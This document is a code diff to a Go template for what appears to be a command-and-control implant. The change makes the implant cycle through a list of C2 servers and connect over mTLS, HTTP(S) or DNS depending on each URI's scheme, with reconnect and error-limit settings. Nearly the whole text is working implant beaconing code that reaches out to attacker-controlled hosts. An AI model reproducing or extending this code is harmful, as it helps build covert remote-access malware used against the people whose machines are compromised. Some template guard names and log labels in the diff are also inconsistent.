@@ -4,7 +4,7 @@ import (
 	"crypto/x509"
 	"io"
 
-	// {{if .HTTPServer}}
+	// {{if .HTTPc2Enabled}}
 	"net"
 	"net/url"
 
@@ -20,7 +20,7 @@ import (
 	"sync"
 	"time"
 
-	// {{if .HTTPServer}}
+	// {{if .HTTPc2Enabled}}
 	"github.com/golang/protobuf/proto"
 	// {{end}}
 )
@@ -30,20 +30,11 @@ var (
 	certPEM   = `{{.Cert}}`
 	caCertPEM = `{{.CACert}}`
 
-	// {{if .MTLSServer}}
-	mtlsServer = `{{.MTLSServer}}`
-	// {{end}}
-
-	// {{if .DNSParent}}
-	dnsParent = `{{.DNSParent}}`
-	// {{end}}
-
-	readBufSize = 16 * 1024 // 16kb
-
-	maxErrors = 100 // TODO: Make configurable
-
-	mtlsLPort         = getDefaultMTLSLPort()
+	readBufSize       = 16 * 1024 // 16kb
+	maxErrors         = getMaxConnectionErrors()
 	reconnectInterval = getReconnectInterval()
+
+	ccCounter = new(int)
 )
 
 // Connection - Abstract connection to the server
@@ -103,41 +94,59 @@ func StartConnectionLoop() *Connection {
 		var connection *Connection
 		var err error
 
+		uri := nextCCServer()
+		// {{if .Debug}}
+		log.Printf("Next CC = %s", uri.String())
+		// {{end}}
+
+		switch uri.Scheme {
+
 		// *** MTLS ***
-		// {{if .MTLSServer}}
-		connection, err = mtlsConnect()
-		if err == nil {
-			return connection
-		}
-		// {{if .Debug}}
-		log.Printf("[mtls] Connection failed %s", err)
-		// {{end}}
-		connectionAttempts++
-		// {{end}}  - MTLSServer
+		// {{if .MTLSc2Enabled}}
+		case "mtls":
+			connection, err = mtlsConnect(uri)
+			if err == nil {
+				return connection
+			}
+			// {{if .Debug}}
+			log.Printf("[mtls] Connection failed %s", err)
+			// {{end}}
+			connectionAttempts++
+			// {{end}}  - MTLSc2Enabled
 
-		// *** HTTP ***
-		// {{if .HTTPServer}}
-		connection, err = httpConnect()
-		if err == nil {
-			return connection
-		}
-		// {{if .Debug}}
-		log.Printf("[mtls] Connection failed %s", err)
-		// {{end}}
-		connectionAttempts++
-		// {{end}} - HTTPServer
+		case "https":
+			fallthrough
+		case "http":
+			// *** HTTP ***
+			// {{if .HTTPc2Enabled}}
+			connection, err = httpConnect(uri)
+			if err == nil {
+				return connection
+			}
+			// {{if .Debug}}
+			log.Printf("[mtls] Connection failed %s", err)
+			// {{end}}
+			connectionAttempts++
+			// {{end}} - HTTPc2Enabled
 
-		// *** DNS ***
-		// {{if .DNSParent}}
-		connection, err = dnsConnect()
-		if err == nil {
-			return connection
+		case "dns":
+			// *** DNS ***
+			// {{if .DNSc2Enabled}}
+			connection, err = dnsConnect(uri)
+			if err == nil {
+				return connection
+			}
+			// {{if .Debug}}
+			log.Printf("[dns] Connection failed %s", err)
+			// {{end}}
+			connectionAttempts++
+			// {{end}} - DNSc2Enabled
+
+		default:
+			// {{if .Debug}}
+			log.Printf("Unknown c2 protocol %s", uri.Scheme)
+			// {{end}}
 		}
-		// {{if .Debug}}
-		log.Printf("[dns] Connection failed %s", err)
-		// {{end}}
-		connectionAttempts++
-		// {{end}} - DNSParent
 
 		// {{if .Debug}}
 		log.Printf("sleep ...")
@@ -151,6 +160,21 @@ func StartConnectionLoop() *Connection {
 	return nil
 }
 
+var ccServers = []string{
+	// {{ range _, $value := .C2 }}
+	"{{$value}}",
+	// {{ end }}
+}
+
+func nextCCServer() *url.URL {
+	uri, err := url.Parse(ccServers[*ccCounter%len(ccServers)])
+	*ccCounter++
+	if err != nil {
+		return nextCCServer()
+	}
+	return uri
+}
+
 func getReconnectInterval() time.Duration {
 	reconnect, err := strconv.Atoi(`{{.ReconnectInterval}}`)
 	if err != nil {
@@ -159,12 +183,24 @@ func getReconnectInterval() time.Duration {
 	return time.Duration(reconnect) * time.Second
 }
 
+func getMaxConnectionErrors() int {
+	maxConnectionErrors, err := strconv.Atoi(`{{.MaxConnectionErrors}}`)
+	if err != nil {
+		return 1000
+	}
+	return maxConnectionErrors
+}
+
 // {{if .MTLSServer}}
-func mtlsConnect() (*Connection, error) {
+func mtlsConnect(uri *url.URL) (*Connection, error) {
 	// {{if .Debug}}
-	log.Printf("Connecting -> %s:%d", mtlsServer, uint16(mtlsLPort))
+	log.Printf("Connecting -> %s", uri.Host)
 	// {{end}}
-	conn, err := tlsConnect(mtlsServer, uint16(mtlsLPort))
+	lport, err := strconv.Atoi(uri.Port())
+	if err != nil {
+		lport = 8888
+	}
+	conn, err := tlsConnect(uri.Hostname(), uint16(lport))
 	if err != nil {
 		return nil, err
 	}
@@ -214,21 +250,13 @@ func mtlsConnect() (*Connection, error) {
 
 // {{end}} -MTLSServer
 
-func getDefaultMTLSLPort() int {
-	lport, err := strconv.Atoi(`{{.MTLSLPort}}`)
-	if err != nil {
-		return 8888
-	}
-	return lport
-}
-
 // {{if .HTTPServer}}
-func httpConnect() (*Connection, error) {
-	address := getHTTPAddress()
+func httpConnect(uri *url.URL) (*Connection, error) {
+
 	// {{if .Debug}}
-	log.Printf("Connecting -> http(s)://%s", address)
+	log.Printf("Connecting -> http(s)://%s", uri.Host)
 	// {{end}}
-	client, err := HTTPStartSession(address)
+	client, err := HTTPStartSession(uri.Host)
 	if err != nil {
 		// {{if .Debug}}
 		log.Printf("http(s) connection error %v", err)
@@ -312,14 +340,11 @@ func httpConnect() (*Connection, error) {
 	return connection, nil
 }
 
-func getHTTPAddress() string {
-	return "{{.HTTPServer}}:{{.HTTPLPort}}"
-}
-
 // {{end}} -HTTPServer
 
 // {{if .DNSParent}}
-func dnsConnect() (*Connection, error) {
+func dnsConnect(uri *url.URL) (*Connection, error) {
+	dnsParent := uri.Hostname()
 	// {{if .Debug}}
 	log.Printf("Attempting to connect via DNS via parent: %s\n", dnsParent)
 	// {{end}}
